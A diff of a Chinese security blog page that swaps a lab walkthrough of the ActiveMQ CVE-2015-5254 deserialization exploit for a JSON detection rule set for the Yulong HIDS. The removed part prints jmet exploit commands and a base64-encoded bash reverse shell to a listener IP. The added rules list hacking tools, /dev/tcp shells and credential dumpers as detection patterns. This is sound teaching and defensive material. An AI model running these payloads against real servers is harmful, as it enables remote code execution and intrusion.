@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      ActiveMQ反序列化漏洞(CVE-2015-5254) | 酷武.
+      驭龙hids初始化规则 | 酷武.
     
   </title>
   <meta name="author" content="小武">
@@ -164,7 +164,7 @@
 	<!-- Page title -->
 	<p>
 		
-			当前文章&nbsp;:&nbsp;《ActiveMQ反序列化漏洞(CVE-2015-5254)》
+			当前文章&nbsp;:&nbsp;《驭龙hids初始化规则》
 		
 	</p>
 
@@ -273,8 +273,8 @@
 	<div class="article-title">
 		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
 		
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		ActiveMQ反序列化漏洞(CVE-2015-5254)
+	<a href="/2019/06/25/驭龙hids初始化规则/" itemprop="url">
+		驭龙hids初始化规则
 	</a>
 
 	</div>
@@ -287,9 +287,9 @@
 
 	发布于
 
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		<time datetime="2019-06-13T05:15:40.000Z" itemprop="datePublished">
-	  		2019-06-13
+	<a href="/2019/06/25/驭龙hids初始化规则/" itemprop="url">
+		<time datetime="2019-06-25T03:37:22.000Z" itemprop="datePublished">
+	  		2019-06-25
 	  </time>
 	</a>
 	&nbsp;
@@ -305,9 +305,9 @@
 
 	更新于
 
-	<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" itemprop="url">
-		<time datetime="2019-06-13T05:15:40.000Z" itemprop="dateUpdated">
-	  		2019-08-15
+	<a href="/2019/06/25/驭龙hids初始化规则/" itemprop="url">
+		<time datetime="2019-06-25T03:37:22.000Z" itemprop="dateUpdated">
+	  		2019-08-17
 	  </time>
 	</a> 
 
@@ -332,9 +332,7 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<p>1.漏洞介绍：<br>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程***者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
-<p>2.漏洞利用过程如下：<br>①构造可执行命令的序列化对象<br>②作为一个消息，发送到目标61616端口<br>③访问web管理页面，读取信息，触发漏洞</p>
-<p>3.漏洞复现：<br>①.首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br><img src="https://s2.ax1x.com/2019/08/15/mAlpFI.png" alt="mAlpFI.png"><br>mkdir external<br><img src="https://s2.ax1x.com/2019/08/15/mAMtu4.png" alt="mAMtu4.png"><br>②.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 靶机的ip 61616<br><img src="https://s2.ax1x.com/2019/08/15/mA188P.png" alt="mA188P.png"><br>③.它会给你的ID，访问http://你的ip：8161:8161/admin/queues.jsp<br><img src="https://s2.ax1x.com/2019/08/15/mA3tRx.png" alt="mA3tRx.png"><br><img src="https://s2.ax1x.com/2019/08/15/mA36JI.png" alt="mA36JI.png"><br>④.利用方式也很简单，我们只要将命令换成反弹shell语句再利用就行了。不过在这里我们需要一些小技巧来绕过Java的机制。<br>bash -i &gt;&amp; /dev/tcp/靶机IP/8888 0&gt;&amp;1 bese64编码<br><img src="https://s2.ax1x.com/2019/08/15/mA8Cf1.png" alt="mA8Cf1.png"><br>把编码放进去。<br>bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}<br>⑤.然后我们是使用同样的命令将payload发送到61616端口。<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xOTkuMTkzLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}” -Yp ROME 靶机ip 61616<br><img src="https://s2.ax1x.com/2019/08/15/mA8J0g.png" alt="mA8J0g.png"><br>⑥.然后我们查看这条消息，触发命令执行，这时我们在靶机上监听端口，即可得到shell。<br><img src="https://s2.ax1x.com/2019/08/15/mA8DXT.png" alt="mA8DXT.png"><br>⑦.成功。</p>
+		<p>[<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “web进程执行了系统命令，可能为命令执行漏洞或者webshell行为”,<br>            “level”: 0,<br>            “name”: “WebServer可疑进程启动(windows)”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “^(cmd\.exe|powershell\.exe)$”,<br>                “type”: “regex”<br>            },<br>            “parentname”: {<br>                “data”: “^(w3wp\.exe|httpd\.exe|nginx\.exe|php-cgi\.exe)$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “所有服务器从未出现过的进程”,<br>            “level”: 1,<br>            “name”: “首次出现进程”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: false,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “黑客工具和可疑程序列表”,<br>            “level”: 0,<br>            “name”: “黑客工具(windows)”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “f\-scrack\.py|rtcp\.py|s5\.py|wmiexec\.vbs”,<br>                “type”: “regex”<br>            },<br>            “name”: {<br>                “data”: “^(nc\.exe|sl\.exe|hd\.exe|s\.exe|portmap\.exe|putty\.exe|s5\.exe|sock5\.exe|iisputscan\.exe|htran\.exe|hfs\.exe|rsh\.exe|netty\.exe|rexec\.exe|icenw\.exe|netsh\.exe|chopper\.exe|srvinfo\.exe|naruto-domain\.exe|rcsocket\.exe|mt\.exe|hatchet\.exe|session\.exe|cain\.exe|socksproxy\.exe|psexec\.exe|rssocks\.exe|hydra\.exe|netcat\.exe|lcx\.exe|tunnel\.exe|nmap\.exe|attrib\.exe|mshta\.exe|regasm\.exe|ieexec\.exe)$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “linux黑客工具列表”,<br>            “level”: 0,<br>            “name”: “黑客工具(linux)”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “f-scrack\.py|rtcp\.py|s5\.py|tunnel|lcx|crack|netcat|hydra|xosver|ssock|rssocks|psexec|socks|regeorg|^nmap|rootkit”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “linux”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “Guest用户正常情况为禁止状态”,<br>            “level”: 0,<br>            “name”: “Guest用户异常”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “Guest”,<br>                “type”: “string”<br>            },<br>            “status”: {<br>                “data”: “OK”,<br>                “type”: “string”<br>            }<br>        },<br>        “source”: “userlist”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “所有服务器从未连接过的IP”,<br>            “level”: 1,<br>            “name”: “首次出口连接”<br>        },<br>        “rules”: {<br>            “remote”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            }<br>        },<br>        “source”: “connection”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “企业网络中首次出现的用户”,<br>            “level”: 1,<br>            “name”: “可疑用户”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            }<br>        },<br>        “source”: “userlist”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “带有$符号的隐藏用户,很大可能为黑客设置的隐藏后门账户”,<br>            “level”: 0,<br>            “name”: “隐藏用户”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “\$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “userlist”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “企业网络中首次出现的linux可登陆用户”,<br>            “level”: 1,<br>            “name”: “可疑用户”<br>        },<br>        “rules”: {<br>            “description”: {<br>                “data”: “\/bin\/bash|\/bin\/sh”,<br>                “type”: “regex”<br>            },<br>            “name”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            }<br>        },<br>        “source”: “userlist”,<br>        “system”: “linux”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “非运维常用登陆IP”,<br>            “level”: 1,<br>            “name”: “可疑登陆”<br>        },<br>        “rules”: {<br>            “remote”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            },<br>            “status”: {<br>                “data”: “true”,<br>                “type”: “string”<br>            }<br>        },<br>        “source”: “loginlog”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “整个内网首次出现的自启动服务”,<br>            “level”: 1,<br>            “name”: “可疑服务”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            },<br>            “startmode”: {<br>                “data”: “Auto”,<br>                “type”: “string”<br>            }<br>        },<br>        “source”: “service”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “企业网络中首次出现的计划任务”,<br>            “level”: 1,<br>            “name”: “可疑计划任务”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “1”,<br>                “type”: “count”<br>            }<br>        },<br>        “source”: “crontab”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “系统文件被篡改，可能为攻击者留下的后门。”,<br>            “level”: 0,<br>            “name”: “系统文件异常变化”<br>        },<br>        “rules”: {<br>            “action”: {<br>                “data”: “WRITE”,<br>                “type”: “string”<br>            },<br>            “path”: {<br>                “data”: “cmd\.exe|magnify\.exe|sethc\.exe|osk\.exe|narrator\.exe|displayswitch\.exe|powershell\.exe|explorer\.exe|\/bin\/ps|\/bin\/netstat|\/bin\/last|\/sbin\/ss|\/etc\/pam.d\/“,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “file”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “可能为攻击者上传的webshell”,<br>            “level”: 0,<br>            “name”: “可疑动态脚本写入”<br>        },<br>        “rules”: {<br>            “action”: {<br>                “data”: “WRITE”,<br>                “type”: “string”<br>            },<br>            “path”: {<br>                “data”: “\.(asp|asa|cer|cdx|htr|hdx|aspq|rem|rules|soap|svc|vbhtm[l]?|xamlx|xoml|asmx|ashx|asax|aspx|ascx|cshtm[l]?|cs|jsp|jspx|jspf|php[1-5]?)([\.]+)?$”,<br>                “type”: “regex”<br>            },<br>            “user”: {<br>                “data”: “administrators”,<br>                “type”: “non-regex”<br>            }<br>        },<br>        “source”: “file”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “利用web server的解析漏洞或者系统特性的异常文件”,<br>            “level”: 0,<br>            “name”: “异常文件写入”<br>        },<br>        “rules”: {<br>            “action”: {<br>                “data”: “WRITE”,<br>                “type”: “string”<br>            },<br>            “path”: {<br>                “data”: “\.php[1-5]?\.[a-z1-9]|\/(con|aux|prn|nul|com[1-9]|lpt[1-9])\.”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “file”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “linux可疑命令”,<br>            “level”: 1,<br>            “name”: “可疑命令”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “insmod|hacker|\/dev\/tcp\/|\/dev\/udp|history \-c|vi.<em>?history|touch \-d”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “linux”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “尝试关闭agent，可能为攻击者所为。”,<br>            “level”: 1,<br>            “name”: “关闭安全agent”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “systemctl stop yulong-hids|net stop yulong-hids”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “all”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “模仿系统文件名，伪装为系统进程，可能为恶意程序。”,<br>            “level”: 0,<br>            “name”: “伪装系统进程(svchost.exe)”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “^\&quot;?c:\\{1,2}windows\\{1,2}system32\\{1,2}svchost\.exe\&quot;?”,<br>                “type”: “non-regex”<br>            },<br>            “name”: {<br>                “data”: “svchost.exe”,<br>                “type”: “string”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “不平常的调用方式，很大几率为攻击者所为”,<br>            “level”: 1,<br>            “name”: “可疑命令调用行为”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “^(bitsadmin \/transfer|powershell \-exec bypass|powershell.</em>?webclient|rundll32|regsvr32.<em>?\/i\:|certutil.</em>?\-f|cscript.*?pubprn\.vbs)”,<br>                “type”: “regex”<br>            },<br>            “parentname”: {<br>                “data”: “^(cmd\.exe|powershell\.exe)$”,<br>                “type”: “regexp”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “数据库进程执行命令，很大几率为攻击者所为。”,<br>            “level”: 0,<br>            “name”: “数据库执行命令”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “cmd.exe”,<br>                “type”: “string”<br>            },<br>            “parentname”: {<br>                “data”: “^(sqlservr\.exe|mysqld.exe)$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: false,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “用于导出系统密码的黑客工具，需立刻处理。”,<br>            “level”: 0,<br>            “name”: “HashDump黑客工具”<br>        },<br>        “rules”: {<br>            “command”: {<br>                “data”: “vssown\.vbs”,<br>                “type”: “regex”<br>            },<br>            “name”: {<br>                “data”: “^(mimikatz\.exe|quarkspwdump\.exe|prodump\.exe|creddump\.exe|pwdump7\.exe|wce\.exe|gethashes\.exe|gsecdump\.exe|ntdsutil\.exe)$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “windows”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “web进程执行了系统命令，可能为命令执行漏洞或者webshell行为”,<br>            “level”: 0,<br>            “name”: “WebServer可疑进程启动(linux)”<br>        },<br>        “rules”: {<br>            “name”: {<br>                “data”: “\/bin\/“,<br>                “type”: “regex”<br>            },<br>            “parentname”: {<br>                “data”: “^(apache[2]?|nginx|php)$”,<br>                “type”: “regex”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “linux”<br>    },<br>    {<br>        “and”: true,<br>        “enabled”: true,<br>        “meta”: {<br>            “author”: “wolf”,<br>            “description”: “web中间件执行了系统命令，可能为命令执行漏洞或者webshell行为”,<br>            “level”: 0,<br>            “name”: “Web中间件可疑进程启动(linux)”<br>        },<br>        “rules”: {<br>            “info”: {<br>                “data”: “tomcat|weblogic”,<br>                “type”: “regex”<br>            },<br>            “parentname”: {<br>                “data”: “java”,<br>                “type”: “string”<br>            }<br>        },<br>        “source”: “process”,<br>        “system”: “linux”<br>    }<br>]</p>
 	
 	</div>
 	
@@ -353,10 +351,10 @@
 	<span>
 		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
 		
-			<a href="/2019/06/13/Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析/" title="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析" rel="prev">
-				&laquo;上一篇
-			</a>
 		
+			<a href="/2019/06/24/centos7安装搭建驭龙hids/" title="centos7安装搭建驭龙hids" rel="next">
+				下一篇&raquo;
+			</a>
 			
 	</span>
 
@@ -372,29 +370,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/06/25/驭龙hids初始化规则/" title="驭龙hids初始化规则">
-								驭龙hids初始化规则			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 25日, 2019				
-							</p>
-							<p class="relate-post-content">
-								[    {        “and”: true,        “enabled”: true,        “meta”: {            “author”: “wolf”,            “descript...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/06/25/驭龙hids初始化规则/" title="驭龙hids初始化规则">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="驭龙hids初始化规则"/>
-							</a>
-						</div>
-					</li>											
-			
 			
 					<li>
 						<div class="relate-post-text">
@@ -577,6 +552,29 @@
 							<a href="/2019/06/13/Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析/" title="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)分析"/>
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" title="ActiveMQ反序列化漏洞(CVE-2015-5254)">
+								ActiveMQ反序列化漏洞(CVE-2015-5254)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 13日, 2019				
+							</p>
+							<p class="relate-post-content">
+								1.漏洞介绍：Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/06/13/ActiveMQ反序列化漏洞(CVE-2015-5254)/" title="ActiveMQ反序列化漏洞(CVE-2015-5254)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="ActiveMQ反序列化漏洞(CVE-2015-5254)"/>
 							</a>
 						</div>
 					</li>											
